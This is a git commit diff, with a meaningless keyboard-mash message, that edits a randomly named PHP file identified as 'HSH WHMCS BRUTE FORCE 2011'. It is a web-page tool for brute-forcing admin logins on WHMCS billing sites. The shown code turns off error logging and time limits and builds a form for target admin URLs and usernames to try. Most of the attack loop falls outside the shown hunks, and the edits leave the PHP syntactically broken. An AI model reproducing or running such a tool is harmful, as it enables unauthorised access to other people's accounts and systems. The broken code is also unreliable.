65d53ae5563de4a00eb66b80830a10f802c1cfa3
antoniola <renata.cantiek@gmail.com>
2016-11-11 06:05:19 +0700

    rtyefdfxzdxcvbnm,nmkjhgfcvbnmbvcx
    gsaetgvcbftdsfdghbmncgfxd

--- w4resftw3wrfsdsadsd.php
+++ w4resftw3wrfsdsadsd.php
@@ -1,13 +1,12 @@
-<?php
+ <?php
 @session_start();
 @error_reporting(0);
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
-@set_magic_quotes_runtime(0);
-@define('VERSION', '2.2');
-echo "<style type=\"text/css\"></style><style type=\"text/css\"></style></head><center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
+@set_magic_quotes_runtime(0)
+echo "<center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
 echo "<textarea rows='15' cols='45' name=\"site\">http://target.com/admin/</textarea>\n"; 
 echo "<textarea rows='15' cols='30' name=\"user\">admin \n"; 
 echo "demo\n"; 
@@ -113,7 +112,4 @@ foreach(explode("\n",$_POST['user']) as $user){
 
 
     } 
-
-
-}
 ?>
